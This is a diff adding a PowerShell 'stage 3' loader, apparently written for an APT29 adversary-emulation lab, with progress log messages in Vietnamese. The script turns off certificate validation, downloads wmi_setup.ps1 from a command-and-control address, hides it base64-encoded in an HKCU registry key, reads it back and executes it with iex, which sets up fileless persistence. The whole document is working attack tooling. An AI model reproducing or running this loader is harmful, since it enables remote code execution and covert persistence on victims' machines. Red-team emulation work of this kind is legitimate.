@@ -1,0 +1,39 @@
+function Invoke-Stage3Main {
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.WebRequest]::DefaultWebProxy = $null
+
+    $PublicDir = "C:\Users\Public\apt29"
+    mkdir $PublicDir -Force -EA SilentlyContinue
+    $LogFile = "$PublicDir\stage3.log"
+    function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $LogFile -Append }
+
+    L "STAGE3 START - PID=$PID"
+
+    $C2 = "https://192.168.56.100:8443"
+
+    L "[A] Tai wmi_setup.ps1"
+    try {
+        $wc = New-Object Net.WebClient
+        $wc.Proxy = $null
+        $PayloadText = $wc.DownloadString("$C2/wmi_setup.ps1")
+        L "  Length: $($PayloadText.Length)"
+    } catch { L "  FAIL: $_"; return }
+
+    L "[B] Ghi Registry"
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
+    reg add "HKCU\Software\Classes\APT29Stage1" /v Payload /t REG_SZ /d $b64 /f | Out-Null
+
+    L "[C] Doc lai + Verify"
+    $readBack = (Get-ItemProperty 'HKCU:\Software\Classes\APT29Stage1').Payload
+    if ($readBack -ne $b64) { L "  MISMATCH"; return }
+    L "  Verify OK"
+
+    L "[D] Decode + chay wmi_setup.ps1"
+    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack))
+    iex $decoded
+
+    L "[E] HOAN TAT - WMI active"
+}
+
+Invoke-Stage3Main
